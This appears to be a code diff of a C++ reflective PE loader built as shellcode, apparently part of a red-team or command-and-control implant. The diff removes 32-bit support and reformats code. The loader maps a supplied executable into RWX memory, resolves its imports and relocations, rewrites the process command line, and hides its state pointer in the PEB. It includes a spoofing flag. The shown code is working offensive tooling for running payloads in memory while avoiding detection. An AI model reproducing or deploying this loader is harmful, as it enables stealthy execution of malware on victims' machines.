@@ -77,15 +77,16 @@ auto DECLFN LoadEssentials(INSTANCE* Instance)->VOID {
 }
 
 // Alloc virtual memory for PE
-auto DECLFN AllocVm( PVOID* Address, SIZE_T ZeroBit, SIZE_T* Size, ULONG AllocType, ULONG Protection ) -> NTSTATUS {
+auto DECLFN AllocVm(PVOID* Address, SIZE_T ZeroBit, SIZE_T* Size, ULONG AllocType, ULONG Protection) -> NTSTATUS {
 	G_INSTANCE
 
-	Instance->Win32.DbgPrint("[+] Allocating virtual memory: Size=%llu, AllocType=%lu, Protection=%lu\n", *Size, AllocType, Protection);
-	if ( ! Instance->Ctx.IsSpoof ) { 
-		return Instance->Win32.NtAllocateVirtualMemory( 
-			NtCurrentProcess(), Address, ZeroBit, Size, AllocType, Protection  
+		Instance->Win32.DbgPrint("[+] Allocating virtual memory: Size=%llu, AllocType=%lu, Protection=%lu\n", *Size, AllocType, Protection);
+	if (!Instance->Ctx.IsSpoof) {
+		return Instance->Win32.NtAllocateVirtualMemory(
+			NtCurrentProcess(), Address, ZeroBit, Size, AllocType, Protection
 		);
-	} else {
+	}
+	else {
 		return Instance->Win32.NtAllocateVirtualMemory(
 			NtCurrentProcess(), Address, ZeroBit, Size, AllocType, Protection
 		);
@@ -93,14 +94,14 @@ auto DECLFN AllocVm( PVOID* Address, SIZE_T ZeroBit, SIZE_T* Size, ULONG AllocTy
 }
 
 // define memory protections
-auto DECLFN ProtVm( PVOID* Address, SIZE_T* Size, ULONG NewProt, ULONG* OldProt ) -> NTSTATUS {
+auto DECLFN ProtVm(PVOID* Address, SIZE_T* Size, ULONG NewProt, ULONG* OldProt) -> NTSTATUS {
 	G_INSTANCE
 
-	if ( ! Instance->Ctx.IsSpoof ) {
-		return Instance->Win32.NtProtectVirtualMemory( NtCurrentProcess(), Address, Size, NewProt, OldProt );
-	} 
+		if (!Instance->Ctx.IsSpoof) {
+			return Instance->Win32.NtProtectVirtualMemory(NtCurrentProcess(), Address, Size, NewProt, OldProt);
+		}
 
-	return ( Instance->Win32.NtProtectVirtualMemory( NtCurrentProcess(), Address, Size, NewProt, OldProt ) );
+	return (Instance->Win32.NtProtectVirtualMemory(NtCurrentProcess(), Address, Size, NewProt, OldProt));
 }
 
 auto DECLFN FixTls(
@@ -175,10 +176,10 @@ auto DECLFN FixExp(
 ) -> VOID {
 	G_INSTANCE
 
-	if (!DataDir || !DataDir->Size || !DataDir->VirtualAddress) {
-		Instance->Win32.DbgPrint("[*] No exception directory present.\n");
-		return;
-	}
+		if (!DataDir || !DataDir->Size || !DataDir->VirtualAddress) {
+			Instance->Win32.DbgPrint("[*] No exception directory present.\n");
+			return;
+		}
 
 	PIMAGE_RUNTIME_FUNCTION_ENTRY FncEntry = (PIMAGE_RUNTIME_FUNCTION_ENTRY)((UPTR)Base + DataDir->VirtualAddress);
 	DWORD EntryCount = DataDir->Size / sizeof(IMAGE_RUNTIME_FUNCTION_ENTRY);
@@ -204,8 +205,7 @@ auto DECLFN FixExp(
 
 auto DECLFN FixImp(
 	_In_ PVOID Base,
-	_In_ IMAGE_DATA_DIRECTORY* DataDir,
-	_In_ BOOL Is64Bit
+	_In_ IMAGE_DATA_DIRECTORY* DataDir
 ) -> BOOL
 {
 	G_INSTANCE
@@ -234,121 +234,60 @@ auto DECLFN FixImp(
 
 		Instance->Win32.DbgPrint("[+] Loaded DLL: %s at %p\n", DllName, DllBase);
 
-		if (Is64Bit) 
+		PIMAGE_THUNK_DATA64 FirstThunk =
+			(PIMAGE_THUNK_DATA64)((UPTR)Base + ImpDesc->FirstThunk);
+
+		PIMAGE_THUNK_DATA64 OrigThunk =
+			ImpDesc->OriginalFirstThunk
+			? (PIMAGE_THUNK_DATA64)((UPTR)Base + ImpDesc->OriginalFirstThunk)
+			: FirstThunk;
+
+		for (; OrigThunk->u1.AddressOfData; ++OrigThunk, ++FirstThunk)
 		{
-			PIMAGE_THUNK_DATA64 FirstThunk =
-				(PIMAGE_THUNK_DATA64)((UPTR)Base + ImpDesc->FirstThunk);
+			PVOID Function = nullptr;
 
-			PIMAGE_THUNK_DATA64 OrigThunk =
-				ImpDesc->OriginalFirstThunk
-				? (PIMAGE_THUNK_DATA64)((UPTR)Base + ImpDesc->OriginalFirstThunk)
-				: FirstThunk;
-
-			for (; OrigThunk->u1.AddressOfData; ++OrigThunk, ++FirstThunk)
+			if (IMAGE_SNAP_BY_ORDINAL64(OrigThunk->u1.Ordinal))
 			{
-				PVOID Function = nullptr;
+				NTSTATUS st =
+					Instance->Win32.LdrGetProcedureAddress(
+						(HMODULE)DllBase,
+						nullptr,
+						(ULONG)IMAGE_ORDINAL64(OrigThunk->u1.Ordinal),
+						&Function
+					);
 
-				if (IMAGE_SNAP_BY_ORDINAL64(OrigThunk->u1.Ordinal))
-				{
-					NTSTATUS st =
-						Instance->Win32.LdrGetProcedureAddress(
-							(HMODULE)DllBase,
-							nullptr,
-							(ULONG)IMAGE_ORDINAL64(OrigThunk->u1.Ordinal),
-							&Function
-						);
-
-					if (!NT_SUCCESS(st) || !Function) {
-						Instance->Win32.DbgPrint("[-] Failed to get ordinal function\n");
-						return FALSE;
-					}
+				if (!NT_SUCCESS(st) || !Function) {
+					Instance->Win32.DbgPrint("[-] Failed to get ordinal function\n");
+					return FALSE;
 				}
-				else
-				{
-					auto ImportByName =
-						(PIMAGE_IMPORT_BY_NAME)(
-							(UPTR)Base + OrigThunk->u1.AddressOfData
-							);
-
-					ANSI_STRING Name;
-					Name.Buffer = (PCHAR)ImportByName->Name;
-					Name.Length = (USHORT)Str::LengthA(Name.Buffer);
-					Name.MaximumLength = Name.Length + 1;
-
-					NTSTATUS st =
-						Instance->Win32.LdrGetProcedureAddress(
-							(HMODULE)DllBase,
-							&Name,
-							0,
-							&Function
-						);
-
-					if (!NT_SUCCESS(st) || !Function) {
-						Instance->Win32.DbgPrint("[-] Failed to get function: %s\n", Name.Buffer);
-						return FALSE;
-					}
-				}
-
-				FirstThunk->u1.Function = (ULONGLONG)Function;
 			}
-		}
-		else 
-		{
-			PIMAGE_THUNK_DATA32 FirstThunk =
-				(PIMAGE_THUNK_DATA32)((UPTR)Base + ImpDesc->FirstThunk);
-
-			PIMAGE_THUNK_DATA32 OrigThunk =
-				ImpDesc->OriginalFirstThunk
-				? (PIMAGE_THUNK_DATA32)((UPTR)Base + ImpDesc->OriginalFirstThunk)
-				: FirstThunk;
-
-			for (; OrigThunk->u1.AddressOfData; ++OrigThunk, ++FirstThunk)
+			else
 			{
-				PVOID Function = nullptr;
-
-				if (IMAGE_SNAP_BY_ORDINAL32(OrigThunk->u1.Ordinal))
-				{
-					NTSTATUS st =
-						Instance->Win32.LdrGetProcedureAddress(
-							(HMODULE)DllBase,
-							nullptr,
-							(ULONG)IMAGE_ORDINAL32(OrigThunk->u1.Ordinal),
-							&Function
+				auto ImportByName =
+					(PIMAGE_IMPORT_BY_NAME)(
+						(UPTR)Base + OrigThunk->u1.AddressOfData
 						);
 
-					if (!NT_SUCCESS(st) || !Function) {
-						Instance->Win32.DbgPrint("[-] Failed to get ordinal function\n");
-						return FALSE;
-					}
+				ANSI_STRING Name;
+				Name.Buffer = (PCHAR)ImportByName->Name;
+				Name.Length = (USHORT)Str::LengthA(Name.Buffer);
+				Name.MaximumLength = Name.Length + 1;
+
+				NTSTATUS st =
+					Instance->Win32.LdrGetProcedureAddress(
+						(HMODULE)DllBase,
+						&Name,
+						0,
+						&Function
+					);
+
+				if (!NT_SUCCESS(st) || !Function) {
+					Instance->Win32.DbgPrint("[-] Failed to get function: %s\n", Name.Buffer);
+					return FALSE;
 				}
-				else
-				{
-					auto ImportByName =
-						(PIMAGE_IMPORT_BY_NAME)(
-							(UPTR)Base + OrigThunk->u1.AddressOfData
-							);
-
-					ANSI_STRING Name;
-					Name.Buffer = (PCHAR)ImportByName->Name;
-					Name.Length = (USHORT)Str::LengthA(Name.Buffer);
-					Name.MaximumLength = Name.Length + 1;
-
-					NTSTATUS st =
-						Instance->Win32.LdrGetProcedureAddress(
-							(HMODULE)DllBase,
-							&Name,
-							0,
-							&Function
-						);
-
-					if (!NT_SUCCESS(st) || !Function) {
-						Instance->Win32.DbgPrint("[-] Failed to get function: %s\n", Name.Buffer);
-						return FALSE;
-					}
-				}
-
-				FirstThunk->u1.Function = (DWORD)(UPTR)Function;
 			}
+
+			FirstThunk->u1.Function = (ULONGLONG)Function;
 		}
 	}
 
@@ -356,7 +295,7 @@ auto DECLFN FixImp(
 }
 
 // Fix relocations
-void FixRel(PVOID Base, UPTR Delta, IMAGE_DATA_DIRECTORY* Dir, SIZE_T SizeOfImage, BOOL Is32Bit)
+void FixRel(PVOID Base, UPTR Delta, IMAGE_DATA_DIRECTORY* Dir, SIZE_T SizeOfImage)
 {
 	G_INSTANCE
 
@@ -377,11 +316,6 @@ void FixRel(PVOID Base, UPTR Delta, IMAGE_DATA_DIRECTORY* Dir, SIZE_T SizeOfImag
 	ULONG RelocationCount = 0;
 	ULONG SkippedCount = 0;
 
-	INT32 Delta32 = (INT32)(INT64)Delta;
-	if (Is32Bit) {
-		Instance->Win32.DbgPrint("[+] 32-bit PE detected. Converting delta: 0x%llX -> 0x%X (signed)\n", Delta, Delta32);
-	}
-
 	while ((UPTR)Reloc < End && Reloc->SizeOfBlock)
 	{
 		auto Count = (Reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
@@ -393,32 +327,7 @@ void FixRel(PVOID Base, UPTR Delta, IMAGE_DATA_DIRECTORY* Dir, SIZE_T SizeOfImag
 			WORD Type = *Entry >> 12;
 			WORD Offset = *Entry & 0xFFF;
 
-			if (Type == IMAGE_REL_BASED_HIGHLOW)  // Type 3 - PE32 standard
-			{
-				DWORD* AddressPtr = (DWORD*)(Page + Offset);
-
-				// Bounds check
-				if ((UPTR)AddressPtr < (UPTR)Base || (UPTR)AddressPtr >= ((UPTR)Base + SizeOfImage)) {
-					Instance->Win32.DbgPrint("[-] WARNING: Relocation address out of bounds: %p\n", AddressPtr);
-					SkippedCount++;
-					continue;
-				}
-
-				if (Is32Bit) {
-					INT32 CurrentValue = (INT32)(*AddressPtr);
-					INT32 NewValue = CurrentValue + Delta32;
-					*AddressPtr = (DWORD)NewValue;
-					if (RelocationCount < 5) {  // Log first few for debugging
-						Instance->Win32.DbgPrint("[+] Reloc[%lu]: 0x%X + 0x%X = 0x%X (addr: %p)\n",
-							RelocationCount, CurrentValue, Delta32, NewValue, AddressPtr);
-					}
-				}
-				else {
-					*AddressPtr += (DWORD)Delta;
-				}
-				RelocationCount++;
-			}
-			else if (Type == IMAGE_REL_BASED_DIR64)  // Type 10 - PE32+ standard
+			if (Type == IMAGE_REL_BASED_DIR64)  // Type 10 - PE32+ standard
 			{
 				ULONGLONG* AddressPtr = (ULONGLONG*)(Page + Offset);
 
@@ -455,7 +364,7 @@ void FixRel(PVOID Base, UPTR Delta, IMAGE_DATA_DIRECTORY* Dir, SIZE_T SizeOfImag
 auto DECLFN FixArguments(WCHAR* wArguments) -> VOID {
 	G_INSTANCE
 
-	PPEB Peb = NtCurrentPeb();
+		PPEB Peb = NtCurrentPeb();
 	PRTL_USER_PROCESS_PARAMETERS pParam = Peb->ProcessParameters;
 
 	Instance->Win32.DbgPrint("[+] Original CommandLine: %.*S\n",
@@ -482,7 +391,7 @@ auto DECLFN FixArguments(WCHAR* wArguments) -> VOID {
 	pParam->CommandLine.Buffer = NewBuf;
 	pParam->CommandLine.Length = (USHORT)(len - sizeof(WCHAR));
 	pParam->CommandLine.MaximumLength = (USHORT)len;
-	
+
 	Instance->Win32.DbgPrint("[+] New CommandLine: %.*S\n",
 		pParam->CommandLine.Length / sizeof(WCHAR),
 		pParam->CommandLine.Buffer
@@ -497,39 +406,39 @@ auto DECLFN FixMemPermissions(
 {
 	G_INSTANCE
 
-	for (INT i = 0; i < Header->FileHeader.NumberOfSections; i++) {
+		for (INT i = 0; i < Header->FileHeader.NumberOfSections; i++) {
 
-		if (!SecHeader[i].Misc.VirtualSize)
-			continue;
+			if (!SecHeader[i].Misc.VirtualSize)
+				continue;
 
-		ULONG SecChar = SecHeader[i].Characteristics;
-		ULONG NewProt = PAGE_READONLY;
+			ULONG SecChar = SecHeader[i].Characteristics;
+			ULONG NewProt = PAGE_READONLY;
 
-		if (SecChar & IMAGE_SCN_MEM_EXECUTE) {
-			NewProt = (SecChar & IMAGE_SCN_MEM_WRITE) ? PAGE_EXECUTE_READWRITE : PAGE_EXECUTE_READ;
+			if (SecChar & IMAGE_SCN_MEM_EXECUTE) {
+				NewProt = (SecChar & IMAGE_SCN_MEM_WRITE) ? PAGE_EXECUTE_READWRITE : PAGE_EXECUTE_READ;
+			}
+			else {
+				NewProt = (SecChar & IMAGE_SCN_MEM_WRITE) ? PAGE_READWRITE : PAGE_READONLY;
+			}
+
+			BYTE* SectionBase = PeBaseAddr + SecHeader[i].VirtualAddress;
+
+			UPTR ProtectBase = ALIGN_DOWN((UPTR)SectionBase, 0x1000);
+
+			SIZE_T ProtectSize = ALIGN_UP((max(SecHeader[i].Misc.VirtualSize, SecHeader[i].SizeOfRawData)) + ((UPTR)SectionBase - ProtectBase), 0x1000);
+
+			PVOID ProtectBasePtr = (PVOID)ProtectBase;
+			ULONG OldProt = 0;
+
+			ProtVm(&ProtectBasePtr, &ProtectSize, NewProt, &OldProt);
 		}
-		else {
-			NewProt = (SecChar & IMAGE_SCN_MEM_WRITE) ? PAGE_READWRITE : PAGE_READONLY;
-		}
-
-		BYTE* SectionBase = PeBaseAddr + SecHeader[i].VirtualAddress;
-
-		UPTR ProtectBase = ALIGN_DOWN((UPTR)SectionBase, 0x1000);
-
-		SIZE_T ProtectSize = ALIGN_UP((max(SecHeader[i].Misc.VirtualSize, SecHeader[i].SizeOfRawData)) + ((UPTR)SectionBase - ProtectBase), 0x1000 );
-
-		PVOID ProtectBasePtr = (PVOID)ProtectBase;
-		ULONG OldProt = 0;
-
-		ProtVm(&ProtectBasePtr, &ProtectSize, NewProt, &OldProt);
-	}
 }
 
 auto DECLFN Reflect(BYTE* Buffer, ULONG Size, WCHAR* Arguments) -> BOOL {
 
 	G_INSTANCE
 
-	Instance->Win32.DbgPrint("[+] === PE LOADER START ===\n");
+		Instance->Win32.DbgPrint("[+] === PE LOADER START ===\n");
 	Instance->Win32.DbgPrint("[+] Buffer: %p, Size: 0x%X\n", Buffer, Size);
 
 	// Validate MZ signature
@@ -558,15 +467,11 @@ auto DECLFN Reflect(BYTE* Buffer, ULONG Size, WCHAR* Arguments) -> BOOL {
 	}
 
 	Instance->Win32.DbgPrint("[+] PE signature valid: 0x%X\n", Header->Signature);
-	Instance->Win32.DbgPrint("[+] Machine: 0x%X (%s)\n", Header->FileHeader.Machine,
-		Header->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64 ? "x64" :
-		Header->FileHeader.Machine == IMAGE_FILE_MACHINE_I386 ? "x86" : "OTHER");
+	Instance->Win32.DbgPrint("[+] Machine: 0x%X (x64)\n", Header->FileHeader.Machine);
 	Instance->Win32.DbgPrint("[+] NumberOfSections: %u\n", Header->FileHeader.NumberOfSections);
 
 	USHORT Magic = Header->OptionalHeader.Magic;
-	Instance->Win32.DbgPrint("[+] Magic: 0x%04X (%s)\n", Magic,
-		Magic == 0x010B ? "PE32 (32-bit)" :
-		Magic == 0x020B ? "PE32+ (64-bit)" : "UNKNOWN");
+	Instance->Win32.DbgPrint("[+] Magic: 0x%04X (PE32+ (64-bit))\n", Magic);
 
 	ULONGLONG ImageBase = 0;
 	SIZE_T SizeOfImage = 0;
@@ -575,49 +480,19 @@ auto DECLFN Reflect(BYTE* Buffer, ULONG Size, WCHAR* Arguments) -> BOOL {
 	PIMAGE_DATA_DIRECTORY DataDirs = NULL;
 	DWORD NumberOfRvaAndSizes = 0;
 
-	if (Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC) 
-	{  
-		// 0x010B
-		Instance->Win32.DbgPrint("[+] PE32 (32-bit executable)\n");
+	PIMAGE_OPTIONAL_HEADER64 OptHdr64 = (PIMAGE_OPTIONAL_HEADER64)&Header->OptionalHeader;
+	ImageBase = OptHdr64->ImageBase;
+	SizeOfImage = OptHdr64->SizeOfImage;
+	SizeOfHeaders = OptHdr64->SizeOfHeaders;
+	AddressOfEntryPoint = OptHdr64->AddressOfEntryPoint;
+	DataDirs = OptHdr64->DataDirectory;
+	NumberOfRvaAndSizes = OptHdr64->NumberOfRvaAndSizes;
 
-		PIMAGE_OPTIONAL_HEADER32 OptHdr32 = (PIMAGE_OPTIONAL_HEADER32)&Header->OptionalHeader;
-		ImageBase = OptHdr32->ImageBase;
-		SizeOfImage = OptHdr32->SizeOfImage;
-		SizeOfHeaders = OptHdr32->SizeOfHeaders;
-		AddressOfEntryPoint = OptHdr32->AddressOfEntryPoint;
-		DataDirs = OptHdr32->DataDirectory;
-		NumberOfRvaAndSizes = OptHdr32->NumberOfRvaAndSizes;
-
-		Instance->Win32.DbgPrint("[+] ImageBase: 0x%X (32-bit)\n", ImageBase);
-		Instance->Win32.DbgPrint("[+] SizeOfImage: 0x%X\n", SizeOfImage);
-		Instance->Win32.DbgPrint("[+] SizeOfHeaders: 0x%X\n", SizeOfHeaders);
-		Instance->Win32.DbgPrint("[+] AddressOfEntryPoint: 0x%X\n", AddressOfEntryPoint);
-		Instance->Win32.DbgPrint("[+] NumberOfRvaAndSizes: %u\n", NumberOfRvaAndSizes);
-	}
-	else if (Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC) 
-	{  
-		// 0x020B
-		Instance->Win32.DbgPrint("[+] PE32+ (64-bit executable)\n");
-
-		PIMAGE_OPTIONAL_HEADER64 OptHdr64 = (PIMAGE_OPTIONAL_HEADER64)&Header->OptionalHeader;
-		ImageBase = OptHdr64->ImageBase;
-		SizeOfImage = OptHdr64->SizeOfImage;
-		SizeOfHeaders = OptHdr64->SizeOfHeaders;
-		AddressOfEntryPoint = OptHdr64->AddressOfEntryPoint;
-		DataDirs = OptHdr64->DataDirectory;
-		NumberOfRvaAndSizes = OptHdr64->NumberOfRvaAndSizes;
-
-		Instance->Win32.DbgPrint("[+] ImageBase: 0x%llX (64-bit)\n", ImageBase);
-		Instance->Win32.DbgPrint("[+] SizeOfImage: 0x%X\n", SizeOfImage);
-		Instance->Win32.DbgPrint("[+] SizeOfHeaders: 0x%X\n", SizeOfHeaders);
-		Instance->Win32.DbgPrint("[+] AddressOfEntryPoint: 0x%X\n", AddressOfEntryPoint);
-		Instance->Win32.DbgPrint("[+] NumberOfRvaAndSizes: %u\n", NumberOfRvaAndSizes);
-	}
-	else 
-	{
-		Instance->Win32.DbgPrint("[-] Unknown PE type: Magic=0x%X\n", Magic);
-		return FALSE;
-	}
+	Instance->Win32.DbgPrint("[+] ImageBase: 0x%llX (64-bit)\n", ImageBase);
+	Instance->Win32.DbgPrint("[+] SizeOfImage: 0x%X\n", SizeOfImage);
+	Instance->Win32.DbgPrint("[+] SizeOfHeaders: 0x%X\n", SizeOfHeaders);
+	Instance->Win32.DbgPrint("[+] AddressOfEntryPoint: 0x%X\n", AddressOfEntryPoint);
+	Instance->Win32.DbgPrint("[+] NumberOfRvaAndSizes: %u\n", NumberOfRvaAndSizes);
 
 	// Validate ImageBase
 	if (ImageBase == 0) {
@@ -636,46 +511,15 @@ auto DECLFN Reflect(BYTE* Buffer, ULONG Size, WCHAR* Arguments) -> BOOL {
 	BYTE* PeBaseAddr = nullptr;
 	NTSTATUS AllocStatus;
 
-	if (Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC)
-	{
-		Instance->Win32.DbgPrint("[+] Allocating 32-bit PE in lower 4GB address space\n");
-
-		PeBaseAddr = (BYTE*)0x00010000;  
-		AllocStatus = Instance->Win32.NtAllocateVirtualMemory(
-			NtCurrentProcess(),
-			(PVOID*)&PeBaseAddr,  
-			0,                    
-			&RegionSize,
-			(MEM_COMMIT | MEM_RESERVE),
-			PAGE_EXECUTE_READWRITE
-		);
-
-		if (!NT_SUCCESS(AllocStatus)) {
-			Instance->Win32.DbgPrint("[!] Allocation at hint failed, retrying without hint\n");
-			PeBaseAddr = nullptr;
-			RegionSize = SizeOfImage;
-			AllocStatus = Instance->Win32.NtAllocateVirtualMemory(
-				NtCurrentProcess(),
-				(PVOID*)&PeBaseAddr,
-				0,
-				&RegionSize,
-				(MEM_COMMIT | MEM_RESERVE),
-				PAGE_EXECUTE_READWRITE
-			);
-		}
-	}
-	else
-	{
-		Instance->Win32.DbgPrint("[+] Allocating 64-bit PE in full 64-bit address space\n");
-		AllocStatus = Instance->Win32.NtAllocateVirtualMemory(
-			NtCurrentProcess(),
-			(PVOID*)&PeBaseAddr,
-			0,
-			&RegionSize,
-			(MEM_COMMIT | MEM_RESERVE),
-			PAGE_EXECUTE_READWRITE
-		);
-	}
+	Instance->Win32.DbgPrint("[+] Allocating 64-bit PE in full 64-bit address space\n");
+	AllocStatus = Instance->Win32.NtAllocateVirtualMemory(
+		NtCurrentProcess(),
+		(PVOID*)&PeBaseAddr,
+		0,
+		&RegionSize,
+		(MEM_COMMIT | MEM_RESERVE),
+		PAGE_EXECUTE_READWRITE
+	);
 
 	if (!NT_SUCCESS(AllocStatus) || !PeBaseAddr) {
 		Instance->Win32.DbgPrint("[-] Allocation failed: 0x%X\n", AllocStatus);
@@ -683,20 +527,6 @@ auto DECLFN Reflect(BYTE* Buffer, ULONG Size, WCHAR* Arguments) -> BOOL {
 	}
 
 	Instance->Win32.DbgPrint("[+] Allocated at: %p (0x%X bytes)\n", PeBaseAddr, SizeOfImage);
-
-	// Verify 32-bit PE was allocated in lower 4GB
-	if (Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC) 
-	{
-		if ((UPTR)PeBaseAddr > 0xFFFFFFFF) 
-		{
-			Instance->Win32.DbgPrint("[-] ERROR: 32-bit PE allocated above 4GB at %p\n", PeBaseAddr);
-			Instance->Win32.DbgPrint("[-] This will cause relocation failures\n");
-		}
-		else 
-		{
-			Instance->Win32.DbgPrint("[+] CONFIRMED: 32-bit PE allocated in lower 4GB\n");
-		}
-	}
 
 	__asm("int3");
 
@@ -730,8 +560,7 @@ auto DECLFN Reflect(BYTE* Buffer, ULONG Size, WCHAR* Arguments) -> BOOL {
 		Instance->Win32.DbgPrint("[+] Reloc Directory: RVA=0x%X, Size=0x%X\n",
 			RelocDir->VirtualAddress, RelocDir->Size);
 
-		BOOL Is32Bit = (Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC);
-		FixRel(PeBaseAddr, Delta, RelocDir, SizeOfImage, Is32Bit);
+		FixRel(PeBaseAddr, Delta, RelocDir, SizeOfImage);
 	}
 	else {
 		Instance->Win32.DbgPrint("[-] DataDirectory array too small\n");
@@ -739,14 +568,12 @@ auto DECLFN Reflect(BYTE* Buffer, ULONG Size, WCHAR* Arguments) -> BOOL {
 	}
 
 	// Fix imports
-	if (NumberOfRvaAndSizes > IMAGE_DIRECTORY_ENTRY_IMPORT) 
+	if (NumberOfRvaAndSizes > IMAGE_DIRECTORY_ENTRY_IMPORT)
 	{
 		IMAGE_DATA_DIRECTORY* ImportDir = &DataDirs[IMAGE_DIRECTORY_ENTRY_IMPORT];
 		Instance->Win32.DbgPrint("[+] Import Directory: RVA=0x%X, Size=0x%X\n", ImportDir->VirtualAddress, ImportDir->Size);
 
-		BOOL Is64Bit = (Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC);
-
-		if (!FixImp(PeBaseAddr, ImportDir, Is64Bit)) {
+		if (!FixImp(PeBaseAddr, ImportDir)) {
 			Instance->Win32.DbgPrint("[-] Import fixup failed\n");
 			return FALSE;
 		}
@@ -810,35 +637,35 @@ auto DECLFN Reflect(BYTE* Buffer, ULONG Size, WCHAR* Arguments) -> BOOL {
 }
 
 EXTERN_C
-auto DECLFN Entry( PVOID Parameter ) -> VOID {
-	PARSER   Psr      = { 0 };
+auto DECLFN Entry(PVOID Parameter) -> VOID {
+	PARSER   Psr = { 0 };
 	INSTANCE Instance = { 0 };
 
 	PVOID ArgBuffer = nullptr;
 
 	NtCurrentPeb()->TelemetryCoverageHeader = (PTELEMETRY_COVERAGE_HEADER)&Instance;
 
-	Instance.Start      = StartPtr();
-	Instance.Size       = (UPTR)EndPtr() - (UPTR)Instance.Start;
+	Instance.Start = StartPtr();
+	Instance.Size = (UPTR)EndPtr() - (UPTR)Instance.Start;
 	Instance.HeapHandle = NtCurrentPeb()->ProcessHeap;
 
-	Parameter ? ArgBuffer = Parameter : ArgBuffer = (PVOID)( (UPTR)Instance.Start + Instance.Size );
+	Parameter ? ArgBuffer = Parameter : ArgBuffer = (PVOID)((UPTR)Instance.Start + Instance.Size);
 
 	LoadEssentials(&Instance);
 
 	Instance.Win32.DbgPrint("\n\n[+] Reflection shellcode started...\n");
-	
-	Parser::New( &Psr, ArgBuffer );
 
-	ULONG  Length    = 0;
-	BYTE*  Buffer    = Parser::Bytes( &Psr, &Length );
-	CHAR*  Arguments = Parser::Str( &Psr );
+	Parser::New(&Psr, ArgBuffer);
+
+	ULONG  Length = 0;
+	BYTE* Buffer = Parser::Bytes(&Psr, &Length);
+	CHAR* Arguments = Parser::Str(&Psr);
 
 	ULONG ArgumentsL = (Str::LengthA(Arguments) + 1) * sizeof(WCHAR);
 
 	WCHAR wArguments[MAX_PATH * 2] = { 0 };
 	Str::CharToWChar(wArguments, Arguments, ArgumentsL);
-	
+
 	ULONG Result = Reflect(Buffer, Length, wArguments);
 
 	Parser::Destroy(&Psr);
